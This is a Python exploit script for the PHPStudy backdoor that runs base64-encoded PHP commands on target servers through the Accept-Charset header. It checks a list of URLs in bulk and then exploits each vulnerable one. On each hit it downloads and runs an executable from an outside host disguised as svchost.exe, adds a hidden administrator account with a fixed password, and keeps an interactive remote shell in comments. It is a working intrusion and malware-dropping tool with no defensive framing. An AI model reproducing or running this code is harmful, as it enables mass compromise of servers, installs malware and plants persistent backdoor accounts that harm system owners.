#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   PHPStudy_Backdoor.py
@Time    :   2019/09/23 19:17:02
@Author  :   fuhei 
@Version :   1.0
@ModifyBy  :   Bakabie
'''

import requests
import base64
import sys
import os

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Sec-Fetch-Site': 'none',
    'accept-charset': 'ZXhpdCgnZnVoZWk2NjYnKTs=',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}
High_authority = 'http://www.fenxiangjingling.com/phpstudy.exe'
Low_authority = 'http://www.fenxiangjingling.com/phpstudy.exe'
log = open("result.txt","a+")

def exp(url):
    command = "system(\"whoami\");"
    
    command = base64.b64encode(command.encode('utf-8'))
    headers['accept-charset'] = str(command, 'utf-8')
    user = result = requests.get(url, headers=headers, verify=False,timeout=10).text.split('<!')[0].strip('\r\n')
    if 'system' in user or 'administrator' in user or 'administrators' in user or 'admin' in user:
        print("[+] Target Has Hight_authority: "+ user+"  execute the High_authority Code.")
        command = '$file=file_get_contents("' + High_authority + '");file_put_contents("C:\\Windows\\svchost.exe",$file);system("C:\\Windows\\svchost.exe");system("net user ASP.NET$ bakabie.qwe123 /add");system("net localgroup administrators ASP.NET /add");'
        command = base64.b64encode(command.encode('utf-8'))
        log.write("H:"+url+"\r\n")
    else:
        print("[!] Target Has Low_authority: " + user + "  use Low_authority mod.Please getshell.")
        command = '$file=file_get_contents("' + Low_authority + '");file_put_contents("C:\\svchost.exe",$file);system("C:\\svchost.exe");'
        command = base64.b64encode(command.encode('utf-8'))
        log.write("L:"+url+"\r\n")
    headers['accept-charset'] = str(command, 'utf-8')
    result = requests.get(url, headers=headers, verify=False,timeout=10)
    print("[+] Target: "+ url + " Finished.")
    print(result.text.split('<!')[0].strip('\r\n'))
    # while(1):
    #     command = input(user+"@fuhei$ ")
    #     if command == 'exit' or command  == 'quit':
    #         break
    #     else:
    #         command = "system(\"" + command + "\");"
    #         command = base64.b64encode(command.encode('utf-8'))
    #         headers['accept-charset'] = str(command, 'utf-8')
    #         result = requests.get(url, headers=headers, verify=False)
    #         result.encoding = "GBK"
    #         result = result.text.split('<!')
    #         if 'Cannot execute a blank command in' in result[0]:
    #             pass
    #         else:
    #             print(result[0], end="")

def check(url):
    result = requests.get(url, headers=headers, verify=False,timeout=10)
    if result.status_code == 200 and 'fuhei666' in result.text:
        print("[!] Now Url: " + url)
        print("[+] Remote code execution vulnerability exists at the target address")
        return True
    else:
        print("[!] Now Url: " + url)
        print("[-] There is no remote code execution vulnerability in the target address")
        return False

if __name__ == '__main__':
    
    urls = []
    if len(sys.argv) == 2:
        if os.path.isfile(sys.argv[1]) == False:
            urls.append(sys.argv[1])
        else:
            f = open(sys.argv[1],"r")
            for i in f.readlines():
                urls.append(i.strip('\r').strip('\n'))
            f.close()
    
    for url in urls:
        try:
            if check(url):
                exp(url)
        except Exception as e:
            print("[-] Error:")
            print("\t\n"+str(e)+"\n")
            continue
